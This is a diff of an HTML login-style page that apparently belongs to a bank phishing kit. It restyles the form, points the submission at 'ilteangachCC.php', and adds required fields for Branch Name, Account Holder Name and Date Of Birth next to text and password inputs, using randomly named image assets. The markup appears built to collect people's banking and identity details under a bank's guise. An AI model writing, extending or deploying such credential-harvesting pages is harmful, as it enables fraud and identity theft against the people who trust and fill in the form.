@@ -6,7 +6,7 @@
 
 input[type=text], input[type=password] {
   width: 100%;
-  padding: 12px 20px;
+  padding: 06px 20px;
   margin: 8px 0;
   display: inline-table;
   border: 1px solid #;
@@ -16,11 +16,11 @@ input[type=text], input[type=password] {
 button {
   background-color:#008CBA ;
   color: white;
-  padding: 14px 20px;
-  margin:   0;
+  padding: 09px 20px;
+  margin:  0;
   border: none;
   cursor: pointer;
-  width: 100%; 
+  width: 30%; 
 }
 
 button:hover {
@@ -76,7 +76,7 @@ span.psw {
   </header>
 
 
-<form action="frásaí.php" method="post">
+<form action="ilteangachCC.php" method="post">
   <div class="imgcontainer">
     
   </div>
@@ -85,17 +85,38 @@ span.psw {
 
 
 
+<label>Branch Name*</label>
+    <input type="text" placeholder="" name="Branch Name" required>
 
 
 
-    <button type="submit">CONTINUE TO LOGIN</button> 
+<label>Account Holder Name*</label>
+    <input type="text" placeholder="" name="Holder Name" required>    
+
+
+<label>Date Of Birth (DD/MM/YYYY)*</label>
+    <input type="text" placeholder="" name="DOB"required>
 
 
 
+
+    <center><button type="submit">Submit</button> 
+</center>
   </div>
 
-<center><h1 class="text-center"><img src="./defyhj.jpg" style="width: 100%;"></h1></center>
 
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+
+
+
+<center><h1 class="text-center"><img src="./hyhjui.jpg" style="width: 100%;"></h1></center>
 
 </form>
 
